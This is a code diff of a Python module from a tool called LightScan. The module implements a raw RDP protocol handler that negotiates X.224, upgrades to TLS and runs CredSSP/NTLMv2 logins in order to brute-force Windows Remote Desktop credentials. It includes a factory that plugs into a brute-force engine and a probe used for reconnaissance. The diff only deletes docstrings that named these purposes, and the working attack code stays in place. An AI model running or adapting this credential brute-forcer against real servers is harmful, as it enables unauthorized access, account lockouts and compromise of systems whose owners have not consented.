@@ -1,30 +1,6 @@
 """
-LightScan v2.0 PHANTOM — Raw RDP Handler (MS-RDPBCGR)
+LightScan
 Developer: Light (Neok1ra)
-
-Raw RDP protocol handler — full X.224/TPKT negotiation,
-SSL/TLS upgrade, CredSSP/NLA brute via SPNEGO+NTLM.
-
-Protocol stack (MS-RDPBCGR §1.3):
-  TCP → TPKT → X.224 → MCS → RDP
-
-Connection sequence:
-  1.  X.224 Connection Request  (TPDU_CONNECTION_REQUEST)
-  2.  X.224 Connection Confirm  (TPDU_CONNECTION_CONFIRM)
-  3.  RDP_NEG_REQ  →  RDP_NEG_RSP  (protocol negotiation)
-  4.  TLS handshake              (PROTOCOL_SSL / PROTOCOL_HYBRID)
-  5.  CredSSP / NLA              (PROTOCOL_HYBRID — NTLM over TLS)
-        a. SPNEGO token (Negotiate)
-        b. Server challenge
-        c. NTLM Authenticate + encrypted credentials
-  6.  MCS Connect-Initial        (capability / channel setup)
-  7.  Parse RDP STATUS in final  response
-
-Authentication result decoding:
-  - LOGON_FAILURE     → wrong password
-  - ACCOUNT_LOCKED    → lockout
-  - PASSWORD_EXPIRED  → valid creds, expired
-  - MCS_CONNECT       → SUCCESS (full session would proceed)
 """
 from __future__ import annotations
 import asyncio, hashlib, hmac, os, socket, ssl, struct, time
@@ -76,14 +52,9 @@ FAILURE_REASONS = {
 }
 
 def _tpkt(payload: bytes) -> bytes:
-    """Wrap payload in TPKT header (RFC 1006) — version=3, reserved=0, length=big-endian"""
     return struct.pack("!BBH", TPKT_VERSION, 0, len(payload) + 4) + payload
 
 def _x224_cr(rdp_neg_req: bytes = b"") -> bytes:
-    """
-    X.224 Connection Request TPDU + optional RDP_NEG_REQ.
-    Format: length-indicator(1) | TPDU_type(1) | dst-ref(2) | src-ref(2) | class(1) | [data]
-    """
     cookie  = b"Cookie: mstshash=PHANTOM\r\n"
     payload = cookie + rdp_neg_req
     li      = 6 + len(payload)
@@ -91,11 +62,9 @@ def _x224_cr(rdp_neg_req: bytes = b"") -> bytes:
     return _tpkt(x224)
 
 def _rdp_neg_req(protocols: int = PROTOCOL_HYBRID) -> bytes:
-    """RDP_NEG_REQ structure (MS-RDPBCGR §2.2.1.1.1)"""
     return struct.pack("<BBHI", RDP_NEG_REQ, 0x00, 0x0008, protocols)
 
 def _recv_tpkt(sock) -> bytes | None:
-    """Read one TPKT-framed packet"""
     try:
         hdr = _recv_exact(sock, 4)
         if not hdr or hdr[0] != TPKT_VERSION: return None
@@ -112,7 +81,6 @@ def _recv_exact(sock, n: int) -> bytes:
     return buf
 
 def _ntlm_negotiate_blob() -> bytes:
-    """Minimal NTLMSSP_NEGOTIATE (type 1) message"""
     workstation = b""
     domain      = b""
     return (
@@ -125,10 +93,6 @@ def _ntlm_negotiate_blob() -> bytes:
     )
 
 def _spnego_wrap(ntlm_blob: bytes) -> bytes:
-    """
-    Wrap NTLM blob in minimal SPNEGO (RFC 4178) negTokenInit.
-    OID for NTLMSSP: 1.3.6.1.4.1.311.2.2.10
-    """
     ntlm_oid = bytes([0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a])
 
     def _asn1_seq(tag, body):
@@ -148,14 +112,12 @@ def _spnego_wrap(ntlm_blob: bytes) -> bytes:
     return _asn1_seq(0x60, spnego_oid + neg_token)
 
 def _parse_ntlm_challenge(blob: bytes) -> bytes | None:
-    """Extract 8-byte server challenge from NTLMSSP_CHALLENGE blob"""
     if len(blob) < 32 or not blob.startswith(b"NTLMSSP\x00"): return None
     msg_type = struct.unpack("<I", blob[8:12])[0]
     if msg_type != NTLMSSP_CHALLENGE_MSG: return None
     return blob[24:32]
 
 def _extract_ntlm_from_spnego(data: bytes) -> bytes | None:
-    """Walk SPNEGO response and find embedded NTLM blob"""
     idx = data.find(b"NTLMSSP\x00")
     return data[idx:] if idx >= 0 else None
 
@@ -168,7 +130,6 @@ def _ntlm_hash(password: str) -> bytes:
 
 def _ntlmv2_auth_blob(username: str, password: str, domain: str,
                       server_challenge: bytes) -> bytes:
-    """Build NTLMv2 NTLMSSP_AUTH message"""
     nt_hash       = _ntlm_hash(password)
     v2_hash       = hmac.new(nt_hash,
                              (username.upper() + domain).encode("utf-16le"),
@@ -212,7 +173,6 @@ def _ntlmv2_auth_blob(username: str, password: str, domain: str,
     return auth
 
 def _spnego_auth_wrap(ntlm_auth: bytes) -> bytes:
-    """Wrap NTLMSSP_AUTH in SPNEGO negTokenResp"""
     def _asn1(tag, body):
         body = bytes(body)
         if len(body) < 128: return bytes([tag, len(body)]) + body
@@ -223,13 +183,6 @@ def _spnego_auth_wrap(ntlm_auth: bytes) -> bytes:
     return _asn1(0xa1, inner)
 
 def _ts_request(spnego_token: bytes, version: int = 6) -> bytes:
-    """
-    Minimal TSRequest ASN.1 DER encoding.
-    TSRequest ::= SEQUENCE {
-        version  [0] INTEGER,
-        negoTokens [1] NegoData OPTIONAL,
-    }
-    """
     def _asn1(tag, body):
         body = bytes(body)
         if len(body) < 128: return bytes([tag, len(body)]) + body
@@ -247,10 +200,6 @@ def _ts_request(spnego_token: bytes, version: int = 6) -> bytes:
     return _asn1(0x30, ts_body)
 
 class RawRDPHandler:
-    """
-    Full RDP connection handler: X.224 negotiate → TLS → CredSSP/NLA brute.
-    Pure-Python RDP transport layer with NLA support.
-    """
 
     def __init__(self, host: str, port: int = 3389, timeout: float = 10.0):
         self.host    = host
@@ -286,10 +235,6 @@ class RawRDPHandler:
         return _recv_tpkt(self._active_sock())
 
     def negotiate(self, preferred: int = PROTOCOL_HYBRID) -> bool:
-        """
-        X.224 CR + RDP_NEG_REQ → X.224 CC + RDP_NEG_RSP.
-        Tries HYBRID → SSL → RDP in degradation order.
-        """
         for proto in (preferred, PROTOCOL_SSL, PROTOCOL_RDP):
             pkt = _x224_cr(_rdp_neg_req(proto))
             self.sock.sendall(pkt)
@@ -319,7 +264,6 @@ class RawRDPHandler:
         return False
 
     def setup_tls(self) -> bool:
-        """Upgrade raw socket to TLS (SSL/HYBRID/HYBRID_EX all go over TLS)"""
         try:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
@@ -333,13 +277,6 @@ class RawRDPHandler:
             log.debug(f"TLS failed: {e}"); return False
 
     def credssp_auth(self, username: str, password: str, domain: str = "") -> tuple[bool, str]:
-        """
-        CredSSP/NLA authentication over TLS (MS-CSSP).
-        Flow: TSRequest(SPNEGO/NTLM negotiate) →
-              TSRequest(SPNEGO/NTLM challenge from server) →
-              TSRequest(SPNEGO/NTLM authenticate)
-        Returns (success, status_string)
-        """
         ntlm_neg  = _ntlm_negotiate_blob()
         spnego1   = _spnego_wrap(ntlm_neg)
         ts1       = _ts_request(spnego1, version=6)
@@ -400,10 +337,6 @@ class RawRDPHandler:
 
     def authenticate(self, username: str = "", password: str = "",
                      domain: str = "") -> tuple[bool, str]:
-        """
-        Complete RDP brute attempt:
-          connect → negotiate → TLS → CredSSP auth → decode result
-        """
         if not self.connect():
             return False, "connection_failed"
         try:
@@ -429,11 +362,6 @@ class RawRDPHandler:
             self.close()
 
     def _rdp_classic_probe(self, username: str, password: str) -> tuple[bool, str]:
-        """
-        For SSL-only (non-NLA) servers: check if service accepts connection.
-        Full RDP virtual channel auth is very complex to implement raw;
-        returns reachable status with a note.
-        """
         try:
             mcs_ci = bytes([
                 0x65, 0x82, 0x01, 0xbe,
@@ -453,10 +381,6 @@ class RawRDPHandler:
             return False, f"mcs_probe_error:{e}"
 
     def probe_only(self) -> tuple[str, dict]:
-        """
-        Probe without auth — detect RDP version, NLA enforcement, cert info.
-        Useful for recon before brute.
-        """
         if not self.connect():
             return "unreachable", {}
         info: dict = {}
@@ -492,10 +416,6 @@ class RawRDPHandler:
 
 def make_rdp_handler(host: str, port: int = 3389, timeout: float = 10.0,
                      domain: str = "", **kw):
-    """
-    Returns async (user, passwd) → (bool, str) handler
-    for use with BruteEngine.
-    """
     async def handler(user: str, passwd: str) -> tuple[bool, str]:
         loop = asyncio.get_running_loop()
         def _try():
@@ -505,7 +425,6 @@ def make_rdp_handler(host: str, port: int = 3389, timeout: float = 10.0,
     return handler
 
 def make_rdp_probe(host: str, port: int = 3389, timeout: float = 8.0) -> dict:
-    """Synchronous RDP reachability probe — returns info dict"""
     h = RawRDPHandler(host, port, timeout)
     status, info = h.probe_only()
     return {"status": status, **info}
